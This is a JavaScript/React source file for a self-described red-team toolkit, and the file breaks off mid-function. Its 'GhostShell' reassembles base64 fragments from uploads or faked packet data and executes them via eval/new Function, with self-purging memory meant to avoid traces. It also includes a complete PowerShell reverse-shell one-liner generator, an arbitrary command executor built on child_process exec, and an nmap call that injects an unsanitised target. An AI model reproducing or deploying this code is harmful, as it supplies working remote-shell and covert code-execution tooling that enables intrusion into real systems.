import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { exec } from 'child_process';
import { Bug, Eye, KeyRound, Terminal, Ghost, UploadCloud, Network, Activity } from "lucide-react";
import React, { useState, useEffect } from "react";
// Enhanced GhostShell bootstrap with packet header analysis capabilities
const ghostShellBootstrap = `
(function ghostShellInit() {
    const fragments = {};
    const expectedFragments = 1;
    let received = 0;
    let packetBuffer = [];
    let entropyMap = new Map();
    
    // Network packet analysis system
    const packetAnalyzer = {
        // Extract data from IPv4/IPv6 headers
        extractFromHeaders: function(packetData) {
            try {
                // Parse packet data (simplified representation)
                const headerFields = packetData.split('|');
                if (headerFields.length < 3) return null;
                
                // Extract covert data from ID field, ToS/Traffic Class, or Flow Label
                const extractedData = headerFields[1];
                return extractedData;
            } catch (e) {
                console.warn("[GHOST] Packet analysis error:", e);
                return null;
            }
        },
        
        // Process incoming packet
        processPacket: function(packet) {
            const data = this.extractFromHeaders(packet);
            if (!data) return;
            
            // Store in buffer for entropy-based reconstruction
            packetBuffer.push({
                timestamp: Date.now(),
                data: data,
                sequence: parseInt(packet.split('|')[0])
            });
            
            // Attempt reconstruction after buffer reaches threshold
            if (packetBuffer.length >= 5) {
                this.attemptReconstruction();
            }
        },
        
        // Use packet loss patterns for entropy-based reconstruction
        attemptReconstruction: function() {
            // Sort by sequence
            packetBuffer.sort((a, b) => a.sequence - b.sequence);
            
            // Identify gaps (packet loss pattern)
            const gaps = [];
            for (let i = 1; i < packetBuffer.length; i++) {
                const expectedSeq = packetBuffer[i-1].sequence + 1;
                if (packetBuffer[i].sequence > expectedSeq) {
                    gaps.push({
                        start: expectedSeq,
                        end: packetBuffer[i].sequence - 1,
                        size: packetBuffer[i].sequence - expectedSeq
                    });
                }
            }
            
            // Use gap pattern as entropy source for fragment index
            if (gaps.length > 0) {
                // Calculate entropy value from gap pattern
                const entropyValue = gaps.reduce((sum, gap) => sum + gap.size, 0) % 1000;
                
                // Extract payload from buffer
                const payload = packetBuffer.map(p => p.data).join('');
                
                // Use entropy to determine fragment index
                const fragmentIndex = entropyValue % 100; // Limit to reasonable range
                
                // Process as fragment
                if (payload.length > 0) {
                    addFragment(fragmentIndex, payload);
                    console.log(\`[GHOST] Extracted fragment \${fragmentIndex} from packet headers (entropy: \${entropyValue})\`);
                }
            }
            
            // Clear buffer after processing
            if (packetBuffer.length > 20) {
                packetBuffer = packetBuffer.slice(-10);
            }
        }
    };

    function addFragment(index, payload) {
        if (!fragments[index]) {
            fragments[index] = payload;
            received++;
            console.log(\`[GHOST] Fragment \${ index } accepted (\${ received }/\${expectedFragments})\`);
        }
        if (received >= expectedFragments) assemblePayload();
    }

    function assemblePayload() {
        // Use entropy map to determine correct assembly order
        const entropyKeys = Array.from(entropyMap.keys()).sort();
        let assemblyOrder = Object.keys(fragments).sort((a, b) => a - b);
        
        // If we have entropy data, use it to influence assembly
        if (entropyKeys.length > 0) {
            const entropyFactor = entropyKeys.reduce((sum, key) => sum + entropyMap.get(key), 0) % 7;
            if (entropyFactor % 2 === 1) {
                // Reverse certain segments based on entropy
                const midpoint = Math.floor(assemblyOrder.length / 2);
                const firstHalf = assemblyOrder.slice(0, midpoint);
                const secondHalf = assemblyOrder.slice(midpoint);
                assemblyOrder = [...secondHalf, ...firstHalf];
            }
        }
        
        const fullPayload = assemblyOrder
            .map(i => fragments[i])
            .join('');

        try {
            console.log("[GHOST] Reassembling & executing payload...");
            (new Function(atob(fullPayload)))();
        } catch (e) {
            console.warn("[GHOST] Payload execution error:", e);
        }
    }

    // Network packet capture simulation
    function startPacketCapture() {
        console.log("[GHOST] Starting packet analysis system...");
        
        // In a real implementation, this would hook into network interfaces
        // For simulation, we'll use a timer to generate synthetic packets
        const packetSimulator = setInterval(() => {
            // Generate synthetic packet with sequence, data, and header fields
            const seq = Math.floor(Math.random() * 1000);
            const data = btoa(Math.random().toString(36).substring(2, 7));
            const packet = \`\${seq}|\${data}|IPv\${Math.random() > 0.5 ? '4' : '6'}\`;
            
            // Process the packet
            packetAnalyzer.processPacket(packet);
            
            // Update entropy map based on timing
            const currentEntropy = Date.now() % 100;
            entropyMap.set(Math.floor(entropyMap.size / 10), currentEntropy);
            
        }, 1000);
        
        // Clean up after TTL
        setTimeout(() => {
            clearInterval(packetSimulator);
            console.log("[GHOST] Packet analysis system shutdown.");
        }, 170000);
    }

    window.injectGhostFragment = function(index, b64payload) {
        addFragment(index, b64payload);
    };
    
    window.injectPacketData = function(packetData) {
        packetAnalyzer.processPacket(packetData);
    };

    console.log("[GHOST SHELL] Initialized with packet analysis capabilities.");
    console.log("[GHOST SHELL] Send fragments via: injectGhostFragment(index, b64payload)");
    console.log("[GHOST SHELL] Or inject packet data: injectPacketData(packetData)");
    
    // Start packet analysis system
    startPacketCapture();

    setTimeout(() => {
        console.log("[GHOST SHELL] TTL expired. Purging memory.");
        delete window.injectGhostFragment;
        delete window.injectPacketData;
        for (let k in fragments) delete fragments[k];
        packetBuffer = [];
        entropyMap.clear();
    }, 180000);
})();
`;

function FragmentUploader() {
    const [status, setStatus] = useState("Drop .txt with base64 fragments");

    const handleDrop = async (e) => {
        e.preventDefault();
        const file = e.dataTransfer.files[0];
        if (!file) return;

        const text = await file.text();
        const lines = text.trim().split("\n");

        lines.forEach((line, i) => {
            const cleaned = line.replace(/[^A-Za-z0-9+/=]/g, '');
            window.injectGhostFragment(i, cleaned);
        });
        setStatus(`Injected ${lines.length} fragments.`);
    };

    return (
        <div
            onDrop= { handleDrop }
    onDragOver = {(e) => e.preventDefault()
}
className = "border border-dashed rounded-md p-4 mt-4 bg-muted text-center text-sm"
    >
    <UploadCloud className="mx-auto mb-2" />
        { status }
        </div>
    );
}

function PacketInjector() {
    const [packetData, setPacketData] = useState("");
    const [status, setStatus] = useState("");

    const injectPacket = () => {
        if (!packetData) return;

        try {
            window.injectPacketData(packetData);
            setStatus(`Packet injected: ${packetData.substring(0, 15)}...`);
            setTimeout(() => setStatus(""), 3000);
            setPacketData("");
        } catch (e) {
            setStatus(`Error: ${e.message}`);
        }
    };

    return (
        <div className= "mt-4" >
        <div className="flex space-x-2" >
            <input
                    type="text"
    value = { packetData }
    onChange = {(e) => setPacketData(e.target.value)
}
placeholder = "seq|data|IPv4/6 (e.g. 123|YWJjZGU=|IPv4)"
className = "flex-1 p-2 text-sm border rounded-md"
    />
    <Button onClick={ injectPacket } variant = "outline" size = "sm" >
        <Activity className="w-4 h-4 mr-1" />
            Inject
            </Button>
            </div>
{ status && <p className="text-xs mt-1 text-muted-foreground" > { status } </p> }
</div>
    );
}

function EntropyVisualizer() {
    const [entropyData, setEntropyData] = useState([]);

    useEffect(() => {
        // Simulate entropy data collection
        const timer = setInterval(() => {
            setEntropyData(prev => {
                const newData = [...prev, Math.random()];
                return newData.length > 20 ? newData.slice(-20) : newData;
            });
        }, 1000);

        return () => clearInterval(timer);
    }, []);

    return (
        <div className= "mt-4" >
        <p className="text-xs mb-1" > Packet Loss Entropy Visualization </p>
            < div className = "h-16 bg-black/10 rounded-md flex items-end" >
                {
                    entropyData.map((value, i) => (
                        <div 
                        key= { i }
                        className = "bg-primary/70 w-1 mx-px transition-all duration-300"
                        style = {{ height: `${value * 100}%` }}
                />
                ))
}
</div>
    </div>
    );
}

// Generate fragments from raw code with packet header metadata
function generatePacketFragments(rawCode, chunkSize = 64) {
    const b64 = btoa(rawCode);
    const fragments = [];

    for (let i = 0; i < b64.length; i += chunkSize) {
        const chunk = b64.slice(i, i + chunkSize);
        const seq = fragments.length;
        // Format: sequence|data|protocol
        fragments.push(`${seq}|${chunk}|IPv${seq % 2 === 0 ? '4' : '6'}`);
    }

    return fragments;
}

export default function RedTeamToolkit() {
    const [ghostLoaded, setGhostLoaded] = useState(false);
    const [activeTab, setActiveTab] = useState("recon");

    const loadGhostShell = () => {
        eval(ghostShellBootstrap);
        setGhostLoaded(true);
    };

    return (
        <div className= "grid grid-cols-1 md:grid-cols-2 gap-4 p-4" >
        <Card className="rounded-2xl shadow-xl" >
            <CardContent className="p-4" >
                <Tabs defaultValue="recon" onValueChange = { setActiveTab } >
                    <TabsList className="flex w-full justify-around" >
                        <TabsTrigger value="recon" > <Eye className="mr-2" /> Recon </TabsTrigger>
                            < TabsTrigger value = "exploit" > <Bug className="mr-2" /> Exploit </TabsTrigger>
                                < TabsTrigger value = "payload" > <KeyRound className="mr-2" /> Payloads </TabsTrigger>
                                    < TabsTrigger value = "console" > <Terminal className="mr-2" /> Console </TabsTrigger>
                                        < TabsTrigger value = "ghost" > <Ghost className="mr-2" /> GhostShell </TabsTrigger>
                                            < TabsTrigger value = "network" > <Network className="mr-2" /> Network </TabsTrigger>
                                                </TabsList>

                                                < TabsContent value = "recon" >
                                                    <p className="text-sm" > Quick recon tools for target profiling: </p>
                                                        < div className = "mt-2 space-y-2" >
                                                            <Button variant="secondary" className = "w-full" > Run Nmap Scan </Button>
                                                                < Button variant = "secondary" className = "w-full" > Passive DNS Lookup </Button>
                                                                    < Button variant = "secondary" className = "w-full" > WHOIS & ASN Check </Button>
                                                                        </div>
                                                                        </TabsContent>

                                                                        < TabsContent value = "exploit" >
                                                                            <p className="text-sm" > Scripted exploit modules(for authorized testing only): </p>
                                                                                < div className = "mt-2 space-y-2" >
                                                                                    <Button variant="destructive" className = "w-full" > Exploit SMBv1 </Button>
                                                                                        < Button variant = "destructive" className = "w-full" > SQL Injection </Button>
                                                                                            < Button variant = "destructive" className = "w-full" > Cross - Site Scripting(XSS) </Button>
                                                                                                </div>
                                                                                                </TabsContent>

                                                                                                < TabsContent value = "payload" >
                                                                                                    <p className="text-sm" > Payload generators(download, reverse shell, etc): </p>
                                                                                                        < div className = "mt-2 space-y-2" >
                                                                                                            <Button variant="outline" className = "w-full" > Generate PowerShell Payload </Button>
                                                                                                                < Button variant = "outline" className = "w-full" > Build Bash One - liner </Button>
                                                                                                                    < Button variant = "outline" className = "w-full" > Generate.hta Loader </Button>
                                                                                                                        </div>
                                                                                                                        </TabsContent>

                                                                                                                        < TabsContent value = "console" >
                                                                                                                            <p className="text-sm" > Command execution interface(bind shell / beacon req'd):</p>
                                                                                                                                < textarea
                                placeholder = "Run remote commands..."
                                className = "w-full h-40 mt-2 p-2 bg-black text-green-400 font-mono text-sm rounded-md shadow-inner"
                                                                                                                                > </textarea>
                                                                                                                                < Button className = "mt-2" > Execute </Button>
                                                                                                                                </TabsContent>

                                                                                                                                < TabsContent value = "ghost" >
                                                                                                                                <p className="text-sm" > Inject volatile GhostShell into memory with packet header analysis capabilities.</p>
                                                                                                                                    < Button onClick = { loadGhostShell } variant = "ghost" className = "mt-2 w-full" >
                                                                                                                                        { ghostLoaded? "GhostShell Loaded": "Load GhostShell" }
                                                                                                                                        </Button>
    {
        ghostLoaded && (
            <>
            <FragmentUploader />
            < PacketInjector />
            <EntropyVisualizer />
            </>
        )
    }
    </TabsContent>

        < TabsContent value = "network" >
            <p className="text-sm" > Network packet analysis and IP - based payload reconstruction </p>
                < div className = "mt-4 space-y-4" >
                    <IPBasedReassembly />
                    < PacketCaptureControls />
                    </div>
                    </TabsContent>
                    </Tabs>
                    </CardContent>
                    </Card>
                    </div>
    );
}

// IP-based payload reassembly component
function IPBasedReassembly() {
    const [ipGroups, setIpGroups] = useState({});
    const [selectedIP, setSelectedIP] = useState("");
    const [reassemblyStatus, setReassemblyStatus] = useState("");

    // Simulate packet capture with IP tracking
    useEffect(() => {
        if (!window.ipPacketBuffer) {
            window.ipPacketBuffer = {};

            // Enhanced injectPacketData function that tracks source IP
            const originalInject = window.injectPacketData;
            window.injectPacketData = function (packetData, sourceIP) {
                // Default to a random IP if none provided (for testing)
                const ip = sourceIP || `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

                // Initialize buffer for this IP if needed
                if (!window.ipPacketBuffer[ip]) {
                    window.ipPacketBuffer[ip] = [];
                }

                // Store packet with metadata
                window.ipPacketBuffer[ip].push({
                    data: packetData,
                    timestamp: Date.now(),
                    processed: false
                });

                // Call original handler if it exists
                if (originalInject) originalInject(packetData);

                // Update UI
                setIpGroups({ ...window.ipPacketBuffer });
            };
        }

        // Simulation for demo purposes
        const simulatePackets = setInterval(() => {
            if (window.injectPacketData && Math.random() > 0.7) {
                const sourceIPs = [
                    "10.0.0.1",
                    "172.16.0.5",
                    "192.168.1.100",
                    "2001:db8::1"
                ];
                const ip = sourceIPs[Math.floor(Math.random() * sourceIPs.length)];
                const seq = Math.floor(Math.random() * 100);
                const data = btoa(`packet-${seq}-data`);
                window.injectPacketData(`${seq}|${data}|IPv${seq % 2 === 0 ? '4' : '6'}`, ip);
            }
        }, 2000);

        return () => clearInterval(simulatePackets);
    }, []);

    // Reassemble payload from a specific IP's packets
    const reassembleFromIP = (ip) => {
        if (!window.ipPacketBuffer || !window.ipPacketBuffer[ip]) {
            setReassemblyStatus("No packets found for this IP");
            return;
        }

        try {
            // Sort packets by sequence number
            const packets = [...window.ipPacketBuffer[ip]]
                .map(p => {
                    const parts = p.data.split('|');
                    return {
                        ...p,
                        seq: parseInt(parts[0]),
                        payload: parts[1]
                    };
                })
                .sort((a, b) => a.seq - b.seq);

            // Extract payloads in sequence order
            const assembledPayload = packets.map(p => p.payload).join('');

            // Attempt to decode and execute
            if (assembledPayload.length > 0) {
                try {
                    // Mark packets as processed
                    window.ipPacketBuffer[ip].forEach(p => p.processed = true);

                    // Execute if it looks like base64
                    if (/^[A-Za-z0-9+/=]+$/.test(assembledPayload)) {
                        const decoded = atob(assembledPayload);
                        console.log("[GHOST] Reassembled payload from IP", ip, ":", decoded.substring(0, 50) + "...");
                        setReassemblyStatus(`Reassembled ${packets.length} packets from ${ip}`);

                        // Execute the payload if it appears to be valid JavaScript
                        if (decoded.includes('function') || decoded.includes('var ') ||
                            decoded.includes('let ') || decoded.includes('const ')) {
                            (new Function(decoded))();
                            setReassemblyStatus(`Executed payload from ${ip} (${packets.length} packets)`);
                        }
                    } else {
                        setReassemblyStatus(`Reassembled data from ${ip} is not valid base64`);
                    }
                } catch (e) {
                    console.error("Payload execution error:", e);
                    setReassemblyStatus(`Error: ${e.message}`);
                }
            } else {
                setReassemblyStatus("No valid payload data found");
            }
        } catch (e) {
            setReassemblyStatus(`Reassembly error: ${e.message}`);
        }
    };

    return (
        <div className= "space-y-2" >
        <h3 className="text-sm font-medium" > IP - Based Payload Reassembly </h3>

            < div className = "grid grid-cols-2 gap-2" >
                <div>
                <p className="text-xs mb-1" > Source IP Addresses </p>
                    < div className = "bg-black/10 rounded-md p-2 h-32 overflow-y-auto" >
                        {
                            Object.keys(ipGroups).length === 0 ? (
                                <p className= "text-xs text-muted-foreground" > No packets captured</ p >
                        ) : (
        Object.keys(ipGroups).map(ip => (
            <div 
                                    key= { ip } 
                                    className = {`text-xs p-1 cursor-pointer rounded ${selectedIP === ip ? 'bg-primary text-primary-foreground' : 'hover:bg-muted'}`}
onClick = {() => setSelectedIP(ip)}
                                >
    { ip }({ ipGroups[ip].length } packets)
    </div>
                            ))
                        )}
</div>
    </div>

    < div >
    <p className="text-xs mb-1" > Packet Details </p>
        < div className = "bg-black/10 rounded-md p-2 h-32 overflow-y-auto" >
            {!selectedIP ? (
                <p className= "text-xs text-muted-foreground" > Select an IP address </p>
                        ) : (
    (ipGroups[selectedIP] || []).map((packet, i) => (
        <div key= { i } className = {`text-xs p-1 ${packet.processed ? 'text-muted-foreground' : ''}`}>
    { packet.data.substring(0, 20) }...
    <span className="text-xs opacity-50 ml-1" >
    { new Date(packet.timestamp).toLocaleTimeString() }
    </span>
    </div>
    ))
                        )}
</div>
    </div>
    </div>

    < div className = "flex justify-between items-center" >
        <Button 
                    onClick={ () => selectedIP && reassembleFromIP(selectedIP) }
disabled = {!selectedIP}
size = "sm"
variant = "secondary"
    >
    Reassemble Payload
        </Button>
        < span className = "text-xs text-muted-foreground" > { reassemblyStatus } </span>
            </div>
            </div>
    );
}

// Packet capture controls component
function PacketCaptureControls() {
    const [captureActive, setCaptureActive] = useState(false);
    const [captureFilter, setCaptureFilter] = useState("");
    const [captureStats, setCaptureStats] = useState({ total: 0, filtered: 0 });

    // Toggle packet capture
    const toggleCapture = () => {
        if (!captureActive) {
            // Start capture
            window.packetCaptureStats = { total: 0, filtered: 0 };
            window.packetCaptureFilter = captureFilter;

            // In a real implementation, this would hook into actual network interfaces
            // For simulation, we'll just increment counters
            window.packetCaptureInterval = setInterval(() => {
                if (window.packetCaptureStats) {
                    window.packetCaptureStats.total += Math.floor(Math.random() * 5);
                    window.packetCaptureStats.filtered += Math.floor(Math.random() * 2);
                    setCaptureStats({ ...window.packetCaptureStats });
                }
            }, 1000);

            setCaptureActive(true);
        } else {
            // Stop capture
            clearInterval(window.packetCaptureInterval);
            setCaptureActive(false);
        }
    };

    return (
        <div className= "space-y-2" >
        <h3 className="text-sm font-medium" > Packet Capture Controls </h3>

            < div className = "flex space-x-2" >
                <input
                    type="text"
    value = { captureFilter }
    onChange = {(e) => setCaptureFilter(e.target.value)
}
placeholder = "Filter (e.g. ip.addr == 192.168.1.1)"
className = "flex-1 p-2 text-sm border rounded-md"
disabled = { captureActive }
    />
    <Button 
                    onClick={ toggleCapture }
variant = { captureActive? "destructive": "outline" }
size = "sm"
    >
    { captureActive? "Stop Capture": "Start Capture" }
    </Button>
    </div>

{
    captureActive && (
        <div className="bg-black/10 rounded-md p-2" >
            <div className="flex justify-between text-xs" >
                <span>Total packets: { captureStats.total } </span>
                    < span > Filtered packets: { captureStats.filtered } </span>
                        </div>
                        < div className = "w-full bg-gray-200 rounded-full h-1.5 mt-1" >
                            <div 
                            className="bg-primary h-1.5 rounded-full"
    style = {{ width: `${captureStats.total > 0 ? (captureStats.filtered / captureStats.total) * 100 : 0}%` }
}
                        > </div>
    </div>
    </div>
            )}
</div>
    );
}

// Enhanced fragment generator that includes IP metadata
function generateIPAwareFragments(rawCode, sourceIP, chunkSize = 64) {
    const b64 = btoa(rawCode);
    const fragments = [];

    for (let i = 0; i < b64.length; i += chunkSize) {
        const chunk = b64.slice(i, i + chunkSize);
        const seq = fragments.length;
        // Format: sequence|data|protocol|sourceIP
        fragments.push(`${seq}|${chunk}|IPv${seq % 2 === 0 ? '4' : '6'}|${sourceIP}`);
    }

    return fragments;
}

// Export modules
export const ReconModule = {
    runNmapScan: (target) => {
        return new Promise((resolve, reject) => {
            exec(`nmap -sV ${target}`, (error, stdout) => {
                if (error) reject(error);
                resolve(stdout);
            });
        });
    },

    dnsLookup: async (domain) => {
        const response = await fetch(`https://dns.google/resolve?name=${domain}`);
        return response.json();
    }
};

export const ExploitModule = {
    sqlInjectionTest: async (target, payload) => {
        const response = await fetch(target, {
            method: 'POST',
            body: JSON.stringify({ query: payload }),
            headers: { 'Content-Type': 'application/json' }
        });
        return response.json();
    }
};

export const PayloadModule = {
    generatePowerShell: (ip, port) => {
        return `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
    }
};

export const PayloadGenerator = {
    generatePowershell: (ip, port) => {
        return `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
    },

    // New method to generate IP-aware fragmented payloads
    generateIPAwarePayload: (code, sourceIP) => {
        return generateIPAwareFragments(code, sourceIP);
    }
};

export const ConsoleModule = {
    executeCommand: (command) => {
        return new Promise((resolve, reject) => {
            exec(command, (error, stdout, stderr) => {
                if (error) reject(error);
                resolve(stdout || stderr);
            });
        });
    }
};

// Network packet analysis module
export const NetworkModule = {
    // Parse IPv4 header
    parseIPv4Header: (rawPacket) => {
        // In a real implementation, this would parse actual binary packet data
        // This is a simplified representation for demonstration
        const header = {
            version: 4,
            headerLength: 20,
            dscp: 0,
            ecn: 0,
            totalLength: rawPacket.length,
            identification: Math.floor(Math.random() * 65535),
            flags: 0,
            fragmentOffset: 0,
            ttl: 64,
            protocol: 6, // TCP
            checksum: 0,
            sourceIP: rawPacket.split('|')[3] || '0.0.0.0',
            destinationIP: '127.0.0.1'
        };

        return header;
    },

    // Parse IPv6 header
    parseIPv6Header: (rawPacket) => {
        // Simplified representation
        const header = {
            version: 6,
            trafficClass: 0,
            flowLabel: Math.floor(Math.random() * 1048575),
            payloadLength: rawPacket.length,
            nextHeader: 6, // TCP
            hopLimit: 64,
            sourceIP: rawPacket.split('|')[3] || '::1',
            destinationIP: '::1'
        };

        return header;
    },

    // Extract covert data from packet headers
    extractCovertData: (packet) => {
        try {
            const parts = packet.split('|');
            const isIPv6 = parts[2] === 'IPv6';

            // In a real implementation, this would extract data from actual header fields
            // For this demo, we're using the simplified format: seq|data|protocol|sourceIP
            return {
                sequence: parseInt(parts[0]),
                data: parts[1],
                protocol: parts[2],
                sourceIP: parts[3] || (isIPv6 ? '::1' : '127.0.0.1')
            };
        } catch (e) {
            console.error("Error extracting covert data:", e);
            return null;
        }
    },

    // Calculate entropy from packet loss patterns
    calculateEntropy: (packets) => {
        if (!packets || packets.length < 2) return 0;

        // Sort by sequence
        const sorted = [...packets].sort((a, b) => {
            const seqA = typeof a.sequence === 'number' ? a.sequence : parseInt(a.data.split('|')[0]);
            const seqB = typeof b.sequence === 'number' ? b.sequence : parseInt(b.data.split('|')[0]);
            return seqA - seqB;
        });

        // Calculate gaps
        let totalGap = 0;
        let gapCount = 0;

        for (let i = 1; i < sorted.length; i++) {
            const prevSeq = typeof sorted[i - 1].sequence === 'number' ?
                sorted[i - 1].sequence : parseInt(sorted[i - 1].data.split('|')[0]);
            const currSeq = typeof sorted[i].sequence === 'number' ?
                sorted[i].sequence : parseInt(sorted[i].data.split('|')[0]);

            const gap = currSeq - prevSeq - 1;
            if (gap > 0) {
                totalGap += gap;
                gapCount++;
            }
        }

        // Calculate entropy value based on gap patterns
        const entropy = gapCount > 0 ?
            (totalGap / gapCount) * Math.log2(sorted.length) :
            0;

        return entropy;
    },

    // Group packets by source IP
    groupBySourceIP: (packets) => {
        const groups = {};

        packets.forEach(packet => {
            try {
                const parts = packet.split('|');
                const sourceIP = parts[3] || '0.0.0.0';

                if (!groups[sourceIP]) {
                    groups[sourceIP] = [];
                }

                groups[sourceIP].push(packet);
            } catch (e) {
                console.error("Error grouping packet:", e);
            }
        });

        return groups;
    },

    // Reconstruct payload from packets with the same source IP
    reconstructFromIP: (packets, sourceIP) => {
        // Filter packets by source IP
        const filtered = packets.filter(p => {
            const parts = p.split('|');
            return parts[3] === sourceIP;
        });

        if (filtered.length === 0) return null;

        // Sort by sequence number
        filtered.sort((a, b) => {
            const seqA = parseInt(a.split('|')[0]);
            const seqB = parseInt(b.split('|')[0]);
            return seqA - seqB;
        });

        // Extract and concatenate data portions
        const assembled = filtered.map(p => p.split('|')[1]).join('');

        // Calculate entropy for validation
        const entropy = this.calculateEntropy(filtered.map(p => ({ data: p })));

        return {
            payload: assembled,
            entropy: entropy,
            packetCount: filtered.length,
            sourceIP: sourceIP
        };
    }
};

// Enhanced GhostShell with IP-based payload assembly
function createEnhancedGhostShell() {
    const shellID = 'ghost-shell-' + Math.random().toString(36).substring(2);
    const ttl = 300000; // 5 minutes in ms

    const memory = {
        loaded: Date.now(),
        commands: {},
        packetBuffer: [],
        ipGroups: {},
        whisper: function (msg) {
            console.log('%c[GhostShell]', 'color:#999', msg);
        },
        purge: function () {
            memory.whisper("Self-purge initiated.");
            for (let k in memory) delete memory[k];
            if (typeof window[shellID] !== 'undefined') delete window[shellID];
        }
    };

    function loadCommand(name, fn) {
        memory.commands[name] = fn;
    }

    // Process incoming packet
    function processPacket(packet) {
        memory.packetBuffer.push(packet);

        try {
            const parts = packet.split('|');
            const sourceIP = parts[3] || '0.0.0.0';

            if (!memory.ipGroups[sourceIP]) {
                memory.ipGroups[sourceIP] = [];
            }

            memory.ipGroups[sourceIP].push(packet);
            memory.whisper(`Received packet from ${sourceIP} (${memory.ipGroups[sourceIP].length} total)`);

            // Attempt reassembly when we have enough packets
            if (memory.ipGroups[sourceIP].length >= 3) {
                attemptReassembly(sourceIP);
            }
        } catch (e) {
            memory.whisper(`Error processing packet: ${e.message}`);
        }
    }

    // Attempt to reassemble payload from a specific IP
    function attemptReassembly(sourceIP) {
        if (!memory.ipGroups[sourceIP] || memory.ipGroups[sourceIP].length === 0) {
            return;
        }

        try {
            // Sort by sequence
            const packets = [...memory.ipGroups[sourceIP]].sort((a, b) => {
                return parseInt(a.split('|')[0]) - parseInt(b.split('|')[0]);
            });

            // Extract data portions
            const assembled = packets.map(p => p.split('|')[1]).join('');

            // Check if it looks like base64
            if (/^[A-Za-z0-9+/=]+$/.test(assembled)) {
                try {
                    const decoded = atob(assembled);
                    memory.whisper(`Reassembled payload from ${sourceIP}: ${decoded.substring(0, 30)}...`);

                    // Execute if it looks like code
                    if (decoded.includes('function') || decoded.includes('var ') ||
                        decoded.includes('let ') || decoded.includes('const ')) {
                        (new Function(decoded))();
                        memory.whisper(`Executed payload from ${sourceIP}`);
                    }
                } catch (e) {
                    memory.whisper(`Payload execution error: ${e.message}`);
                }
            }
        } catch (e) {
            memory.whisper(`Reassembly error: ${e.message}`);
        }
    }

    // Base Commands
    loadCommand('help', () => Object.keys(memory.commands));
    loadCommand('echo', args => args.join(' '));
    loadCommand('time', () => new Date().toISOString());
    loadCommand('purge', memory.purge);
    loadCommand('packet', processPacket);
    loadCommand('ips', () => Object.keys(memory.ipGroups));
    loadCommand('reassemble', sourceIP => attemptReassembly(sourceIP));

    memory.whisper("Enhanced GhostShell loaded with IP-based reassembly.");

    // TTL Self-Wipe
    setTimeout(() => {
        memory.whisper("Time-to-live expired.");
        memory.purge();
    }, ttl);

    // Expose entry point without traceable global
    window[shellID] = function (cmd, ...args) {
        if (memory.commands[cmd]) return memory.commands[cmd](args);
        return '[GhostShell] Unknown command';
    };

    // Alias
    window.gs = window[shellID];

    // Expose packet processor
    window.processGhostPacket = processPacket;

    return {
        id: shellID,
        processPacket: processPacket
    };
}

// Export the enhanced GhostShell creator
export const GhostShellModule = {
    createEnhancedGhostShell: createEnhancedGhostShell,
    generateIPAwareFragments: generateIPAwareFragments
};
// Binary Analysis and Scraping Module for GhostShell
export const BinaryAnalysisModule = {
    // Parse binary data from various formats
    parseBinary: (data, format = 'hex') => {
        try {
            let binary;

            switch (format.toLowerCase()) {
                case 'hex':
                    binary = data.replace(/\s/g, '').match(/.{1,2}/g)?.map(byte => parseInt(byte, 16)) || [];
                    break;
                case 'base64':
                    const decoded = atob(data);
                    binary = new Uint8Array(decoded.length);
                    for (let i = 0; i < decoded.length; i++) {
                        binary[i] = decoded.charCodeAt(i);
                    }
                    break;
                case 'raw':
                    binary = new Uint8Array(data.length);
                    for (let i = 0; i < data.length; i++) {
                        binary[i] = data.charCodeAt(i);
                    }
                    break;
                default:
                    throw new Error(`Unsupported format: ${format}`);
            }

            return binary;
        } catch (e) {
            console.error("Binary parsing error:", e);
            return new Uint8Array();
        }
    },

    // Extract potential code fragments from binary data
    extractCodeFragments: (binary) => {
        const fragments = [];
        let currentFragment = [];
        let inTextSegment = false;

        // Look for text segments in binary data
        for (let i = 0; i < binary.length; i++) {
            const byte = binary[i];

            // Check if byte is in printable ASCII range or common code characters
            if ((byte >= 32 && byte <= 126) || byte === 10 || byte === 13 || byte === 9) {
                if (!inTextSegment) {
                    inTextSegment = true;
                    currentFragment = [];
                }
                currentFragment.push(byte);
            } else {
                if (inTextSegment && currentFragment.length > 8) { // Minimum length to consider
                    fragments.push(new Uint8Array(currentFragment));
                }
                inTextSegment = false;
            }
        }

        // Add final fragment if we ended in a text segment
        if (inTextSegment && currentFragment.length > 8) {
            fragments.push(new Uint8Array(currentFragment));
        }

        // Convert fragments to strings
        return fragments.map(frag => {
            return String.fromCharCode.apply(null, frag);
        });
    },

    // Analyze binary for file signatures and structures
    analyzeBinaryStructure: (binary) => {
        const signatures = {
            // File format signatures
            'JPEG': [0xFF, 0xD8, 0xFF],
            'PNG': [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A],
            'GIF': [0x47, 0x49, 0x46, 0x38],
            'PDF': [0x25, 0x50, 0x44, 0x46],
            'ZIP': [0x50, 0x4B, 0x03, 0x04],
            'ELF': [0x7F, 0x45, 0x4C, 0x46],
            'PE': [0x4D, 0x5A],
            // Add more signatures as needed
        };

        const results = {
            fileType: 'unknown',
            sections: [],
            potentialPayloads: []
        };

        // Check file signatures
        for (const [type, sig] of Object.entries(signatures)) {
            if (binary.length >= sig.length) {
                let match = true;
                for (let i = 0; i < sig.length; i++) {
                    if (binary[i] !== sig[i]) {
                        match = false;
                        break;
                    }
                }
                if (match) {
                    results.fileType = type;
                    break;
                }
            }
        }

        // Look for section boundaries (large changes in byte frequency)
        const windowSize = 64;
        const frequencyWindows = [];

